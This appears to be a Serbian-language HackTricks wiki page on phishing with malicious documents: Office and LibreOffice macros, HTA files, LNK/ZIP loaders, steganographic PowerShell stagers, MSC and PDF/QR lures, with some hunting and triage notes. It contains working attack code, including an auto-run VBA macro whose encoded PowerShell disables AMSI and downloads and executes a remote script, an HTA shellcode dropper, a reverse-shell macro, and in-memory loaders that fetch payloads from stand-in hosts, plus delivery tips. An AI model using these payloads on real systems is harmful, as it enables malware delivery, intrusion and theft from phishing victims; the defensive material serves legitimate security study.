# Phishing fajlovi i dokumenti

{{#include ../../banners/hacktricks-training.md}}

## Office dokumenti

Microsoft Word proverava ispravnost podataka u fajlu pre nego što ga otvori. Provera se obavlja identifikacijom strukture podataka prema standardu OfficeOpenXML. Ako tokom identifikacije strukture podataka dođe do greške, analizirani fajl neće biti otvoren.

Word fajlovi koji sadrže makroe obično koriste ekstenziju `.docm`. Međutim, moguće je promeniti ekstenziju fajla i pritom zadržati mogućnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali će Microsoft Word obraditi DOCM fajl kojem je promenjena ekstenzija u RTF i moći će da izvršava makroe.\
Isti interni mehanizmi važe za sav softver iz paketa Microsoft Office (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će izvršavati neki Office programi:

```bash
assoc | findstr /i "word excel powerp"
```

DOCX datoteke koje upućuju na udaljeni predložak (Datoteka – Opcije – Programski dodaci – Upravljanje: Predlošci – Idi) koji sadrži makroe mogu i da „izvršavaju“ makroe.

### Učitavanje spoljne slike

Idite na: _Umetanje --> Brzi delovi --> Polje_\
_**Kategorije**: Veze i reference, **Nazivi polja**: includePicture i **Naziv datoteke ili URL**:_ http://<ip>/whatever

![Office Documents - Učitavanje spoljne slike: Idite na: Umetanje -- Brzi delovi -- Polje](<../../images/image (155).png>)

### Macros Backdoor

Makroi se mogu koristiti za pokretanje proizvoljnog koda iz dokumenta.

#### Funkcije za automatsko učitavanje

Što se češće koriste, veća je verovatnoća da će ih AV otkriti.

- AutoOpen()
- Document_Open()

#### Primeri koda za makroe

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Ručno uklanjanje metapodataka

Idite na **Datoteka > Informacije > Proveri dokument > Proveri dokument** da biste otvorili Document Inspector. Kliknite na **Proveri**, a zatim na **Ukloni sve** pored stavke **Svojstva dokumenta i lični podaci**.

#### Ekstenzija dokumenta

Kada završite, izaberite padajući meni **Sačuvaj kao tip** i promenite format iz **`.docx`** u Word 97-2003 **`.doc`**.\
Uradite to zato što **ne možete da sačuvate makroe unutar datoteke `.docx`**, a ekstenzija **`.docm`** koja podržava makroe ima **lošu reputaciju** (npr. ikonica sličice ima ogromno `!`, a neki web/email gateway-i ih potpuno blokiraju). Zato je ova **zastarela ekstenzija `.doc` najbolji kompromis**.

#### Generatori zlonamernih makroa

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT makroi za automatsko pokretanje (Basic)

LibreOffice Writer dokumenti mogu da sadrže Basic makroe i da ih automatski izvrše kada se datoteka otvori, tako što se makro poveže sa događajem **Otvori dokument** (Alati → Prilagodi → Događaji → Otvori dokument → Makro…).<sup>[[1]](#references)</sup> Jednostavan makro za reverse shell izgleda ovako:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Obratite pažnju na dvostruke navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape-ovanje doslovnih navodnika, pa payload-i koji se završavaju sa `...==""")` imaju pravilno uparene navodnike i u unutrašnjoj komandi i u argumentu za Shell.

Saveti za isporuku:

- Sačuvajte kao `.odt` i povežite macro sa događajem dokumenta kako bi se odmah pokrenuo pri otvaranju.
- Kada šaljete e-poštu pomoću `swaks`, koristite `--attach @resume.odt` (znak `@` je obavezan kako bi se kao prilog poslali bajtovi fajla, a ne string sa nazivom fajla). Ovo je ključno kada se zloupotrebljavaju SMTP serveri koji prihvataju proizvoljne primaoce `RCPT TO` bez validacije.

## HTA fajlovi

HTA je Windows program koji **kombinuje HTML i skriptne jezike (kao što su VBScript i JScript)**. Generiše korisnički interfejs i izvršava se kao aplikacija sa „punim poverenjem“, bez ograničenja bezbednosnog modela pregledača.

HTA se izvršava pomoću **`mshta.exe`**, koji se obično **instalira** zajedno sa **Internet Explorer-om**, što znači da `mshta` zavisi od IE-a. Ako je IE deinstaliran, HTA fajlovi neće moći da se izvrše.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Prisiljavanje NTLM autentikacije

Postoji nekoliko načina da se **udaljeno prisili NTLM autentikacija**. Na primer, možete da dodate **nevidljive slike** u imejlove ili HTML sadržaj komе će korisnik pristupiti (čak i HTTP MitM?). Možete i da pošaljete žrtvi **putanju do fajlova** koji će **pokrenuti** **autentikaciju** čim **otvori fasciklu**.

**Pogledajte ove ideje i još neke na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da možete ne samo da ukradete hash ili podatke za autentikaciju već i da **izvedete NTLM relay napade**:

- [**NTLM Relay napadi**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads ugrađeni u ZIP (fileless lanac)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna dokumenta-mamca (PDF/DOCX) i zlonamerni .lnk fajl. Trik je u tome što je stvarni PowerShell loader smešten u sirovim bajtovima ZIP fajla, iza jedinstvene oznake, a .lnk ga izdvaja i pokreće u celosti u memoriji.<sup>[[2]](#references)</sup>

Tipičan tok koji implementira PowerShell one-liner u .lnk fajlu:

1) Pronađe originalni ZIP na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData% i u nadređenoj fascikli trenutnog radnog direktorijuma.
2) Pročita bajtove ZIP fajla i pronađe hardkodiranu oznaku (npr. xFIQCV). Sve nakon oznake predstavlja ugrađeni PowerShell payload.
3) Kopira ZIP u %ProgramData%, raspakuje ga tamo i otvara .docx mamac kako bi delovao legitimno.
4) Zaobilazi AMSI za trenutni proces: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Dekodira sledeću fazu (npr. uklanja sve znakove #) i izvršava je u memoriji.

Primer PowerShell kostura za izdvajanje ugrađene faze i njeno pokretanje:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Beleške
- Isporuka često zloupotrebljava poddomene renomiranih PaaS-ova (npr., *.herokuapp.com) i može da ograniči isporuku payload-a (da isporučuje bezopasne ZIP-ove na osnovu IP/UA).
- Sledeća faza često dešifruje base64/XOR shellcode i izvršava ga pomoću Reflection.Emit + VirtualAlloc kako bi svela na minimum tragove na disku.

Persistence korišćen u istom lancu
- COM TypeLib hijacking kontrole Microsoft Web Browser, tako da IE/Explorer ili bilo koja aplikacija koja je ugrađuje automatski ponovo pokreće payload.<sup>[[2]](#references)[[4]](#references)</sup> Detalje i komande spremne za upotrebu pogledajte ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Potraga/IOC-ovi
- ZIP datoteke koje sadrže ASCII marker string (npr., xFIQCV) dodat na kraj podataka arhive.
- .lnk koji pretražuje roditeljske/korisničke fascikle da bi pronašao ZIP i otvorio dokument za odvraćanje pažnje.
- AMSI tampering pomoću [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Duge poslovne prepiske koje se završavaju linkovima hostovanim na pouzdanim PaaS domenima.

## Prvo otvaranje dokumenta za odvraćanje pažnje putem LNK → persistence putem scheduled task-a → trusted CPL side-loading

Još jedan obrazac koji se često ponavlja jeste **`.lnk` koji se predstavlja kao dokument** i odmah otvara bezopasan mamac, dok u pozadini priprema stvarni lanac.<sup>[[3]](#references)</sup>

Uočeni tok rada:
1. Prečica **se predstavlja kao PDF** i koristi `conhost.exe` ili sličan proxy da pokrene obfuscate-ovan PowerShell downloader.
2. PowerShell razdvaja očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) tako da naivne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` ne prepoznaju komandu.
3. Stager prvo preuzima **dokument za odvraćanje pažnje**, otvara ga za žrtvu, a zatim u pozadini rekonstruiše zlonamerne datoteke.
4. Payload-i mogu biti zapisani sa **lažnim ekstenzijama**, a zatim preimenovani uklanjanjem dodatnih znakova, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
5. Persistence se uspostavlja pomoću **scheduled task-a koji se pokreće svakog minuta** i pokreće pouzdani host binary sa putanje na koju korisnik može da upisuje.

Minimalni tragovi za potragu na osnovu ovog obrasca:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Korisno je prepoznati sledeći raspored stage-ova:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je drugi stage prikriven

U studiji slučaja Rapid7, zakazani zadatak je više puta pokretao **`Fondue.exe`** iz direktorijuma `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i izvozio **`RunFODW`**, pouzdani Microsoft-ov binarni fajl učitavao je attackerov CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga pomoću **Windows CNG / `bcrypt.dll`**
- Alocira izvršivu memoriju i kopira dešifrovani shellcode u nju
- Indirektno ga izvršava tako što prosleđuje pokazivač na shellcode kao callback za **`EnumUILanguagesW`**

Vredi zasebno tražiti taj poslednji korak: malware često izbegava direktan skok `((void(*)())buf)()` i umesto toga zloupotrebljava **legitimni WinAPI koji prima callback** za prenos izvršavanja.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim u potpunosti mapirao konačni PE u memoriju i zakrpio **AMSI/WLDP/ETW** u trenutnom procesu pre nego što je predao izvršavanje. Za detaljnije beleške o side-loading-u i post-procesiranju rezidentnom u memoriji, pogledajte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični pivot-i za lov:
- `.lnk` pokreće `powershell.exe` ili `conhost.exe`, a zatim se prikazuje decoy dokument.
- Kratkotrajna preuzimanja u **`C:\Users\Public\`**, praćena trenutnim preimenovanjima fajlova sa nasumičnim ekstenzijama.
- Zakazani zadaci sa bezazlenim imenima, kao što je `GoogleErrorReport`, koji se izvršavaju iz **direktorijuma u koje korisnik može da upisuje**.
- Pouzdani binarni fajlovi učitavaju **`.cpl` / `.dll`** fajlove iz istog direktorijuma koji nije sistemski.
- Base64 tekstualni blob-ovi upisani u **`C:\Windows\Tasks\`**, koje zatim čita side-loaded modul.

## Payload-i omeđeni steganografskim markerima u slikama (PowerShell stager)

Noviji lanci loader-a isporučuju zamaskirani JavaScript/VBS koji dekodira i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-kodirani .NET DLL sakriven kao običan tekst između jedinstvenih početnih i završnih markera. Skripta traži ove delimitere (primeri zabeleženi u praksi: «<<sudo_png>> … <<sudo_odt>>>»), izdvaja tekst između njih, Base64-dekodira ga u bajtove, učitava assembly u memoriju i poziva poznati entry metod uz C2 URL.<sup>[[5]](#references)</sup>

Tok rada
- Stage 1: JS/VBS dropper u arhivi → dekodira ugrađeni Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → preuzima sliku, izdvaja Base64 omeđen markerima, učitava .NET DLL u memoriju i poziva njegov metod (npr. VAI), prosleđujući C2 URL i opcije.
- Stage 3: Loader preuzima konačni payload i obično ga ubacuje pomoću process hollowing-a u pouzdani binarni fajl (najčešće MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Više o process hollowing-u i proxy izvršavanju preko pouzdanih alata pročitajte ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell primer za izdvajanje DLL-a iz slike i pozivanje .NET metoda u memoriji:

<details>
<summary>PowerShell izdvajač stego payload-a i loader</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Napomene
- Ovo je ATT&CK T1027.003 (steganografija/sakrivanje markera).<sup>[[6]](#references)</sup> Markeri se razlikuju među kampanjama.
- AMSI/ETW bypass i deobfuskacija stringova se često primenjuju pre učitavanja assembly-ja.
- Lov: skenirajte preuzete slike u potrazi za poznatim delimiterima; identifikujte PowerShell procese koji pristupaju slikama i odmah dekodiraju Base64 blobove.

Pogledajte i stego alate i tehnike izdvajanja:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Česta početna faza je mali, snažno obfuskiran `.js` ili `.vbs` fajl isporučen unutar arhive. Njegova jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` kako bi pokrenuo sledeću fazu preko HTTPS-a.<sup>[[5]](#references)</sup>

Osnovna logika (apstraktno):
- Pročitajte sadržaj sopstvenog fajla
- Pronađite Base64 blob između nasumičnih stringova
- Dekodirajte u ASCII PowerShell
- Izvršite pomoću `wscript.exe`/`cscript.exe`, pozivajući `powershell.exe`

Indikatori za lov
- Arhivirani JS/VBS prilozi koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` pokreće `powershell.exe -nop -w hidden` iz korisničkih privremenih putanja.

## MSC dokumenti kao kontejneri za izvršavanje (GrimResource)

Microsoft Management Console fajlovi (`.msc`) su XML definicije konzole koje se obično otvaraju pomoću `mmc.exe`. **GrimResource** zloupotrebljava referencu `StringTable` ka resursu `apds.dll` koji sadrži stari XSS primitive, tako da otvaranje posebno napravljenе konzole od strane korisnika dovodi do pokretanja JavaScript-a unutar `mmc.exe`. Uočeni primerci kombinovali su obfuskaciju zasnovanu na `transformNode` sa **DotNetToJScript** kako bi instancirali .NET payload bez uobičajenog puta preko Office makroa.<sup>[[9]](#references)</sup>

Za statičku trijažu, tretirajte nepouzdan MSC kao tekst i **nemojte ga otvarati dvostrukim klikom**:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Pokazatelji izvršavanja sa visokim signalom su kada `mmc.exe` učitava CLR ili skriptne komponente, uspostavlja mrežne veze ili pokreće `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ili neočekivanu izvršnu datoteku. Format je legitiman, zato detekcije treba da povezuju **poreklo + sumnjiv XML/skriptni sadržaj + ponašanje `mmc.exe`**, umesto da blokiraju sve MSC datoteke.<sup>[[9]](#references)</sup>

## PDF/QR preusmerivači i payload gating

PDF ne mora da sadrži exploit da bi bio koristan. U nedavnim kampanjama, u dokumente koji deluju bezazleno postavljaju se **QR kod ili običan link**, zatim se sesija pregledača preusmerava van kontrola za e-poštu, a odredište se prilagođava adresi primaoca. Microsoft je dokumentovao PDF-ove iz 2025. čiji su QR URL-ovi bili jedinstveni za svakog primaoca i vodili do infrastrukture za krađu akreditiva RaccoonO365; u paralelnom lancu koristilo se ograničavanje prema IP-u/okruženju, tako da su odabranim posetiocima prikazivali JavaScript/MSI putanju, a skenerima ili nedozvoljenim klijentima bezazlen PDF.<sup>[[10]](#references)</sup>

U trijaži proverite i radnje PDF-a i renderovane QR kodove. QR kod može biti nacrtan kao vektorska grafika, a ne sačuvan kao slika koju je moguće izdvojiti, zato rasterizujte svaku stranicu i izdvojite ugrađene slike:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Pregledajte dekodirana odredišta i preusmeravanja iz izolovanog sistema za analizu, bez autentifikacije. Korisni pokazatelji za potragu uključuju PDF-ove koji sadrže samo QR kodove i gotovo prazna tela imejlova, imejl adresu primaoca ugrađenu u parametar upita, nekoliko preusmeravanja preko pouzdanih hosting servisa i različit sadržaj koji se vraća u zavisnosti od IP adrese, geolokacije, kolačića, referera ili user agenta. Uporedite zahteve koristeći kontrolisane profile jer jedno preuzimanje iz sandbox-a može dobiti samo mamac.<sup>[[10]](#references)</sup>

## Windows fajlovi za krađu NTLM hash-eva

Pogledajte stranicu o **mestima za krađu NTLM kredencijala**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Kampanja ZipLine: sofisticirani phishing napad usmeren na američke kompanije](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: praćenje tradecrafta grupe Dropping Elephant kroz lanac loadera sa kineskom tematikom](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Otmica TypeLib-a – nova COM tehnika postojanosti (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader isporučuje niz infostealera](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console za početni pristup i izbegavanje detekcije](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Akteri pretnji koriste poresku sezonu za sprovođenje phishing kampanja s poreskom tematikom](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
